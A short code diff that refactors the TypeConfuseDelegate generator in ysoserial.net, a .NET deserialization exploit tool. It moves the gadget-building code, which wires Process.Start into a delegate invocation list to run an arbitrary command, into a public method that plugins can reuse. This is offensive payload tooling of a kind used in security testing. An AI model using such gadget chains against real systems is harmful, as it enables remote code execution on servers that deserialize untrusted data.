@@ -25,6 +25,12 @@ namespace ysoserial.Generators
 
         public override object Generate(string cmd, string formatter, Boolean test)
         {
+            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test);
+        }
+
+        /* this can be used easily by the plugins as well */
+        public object TypeConfuseDelegateGadget(string cmd)
+        {
             if (File.Exists(cmd))
             {
                 Console.Error.WriteLine("Reading command from file " + cmd + " ...");
@@ -43,7 +49,7 @@ namespace ysoserial.Generators
             invoke_list[1] = new Func<string, string, Process>(Process.Start);
             fi.SetValue(d, invoke_list);
 
-            return Serialize(set, formatter, test);
+            return set;
         }
 
     }
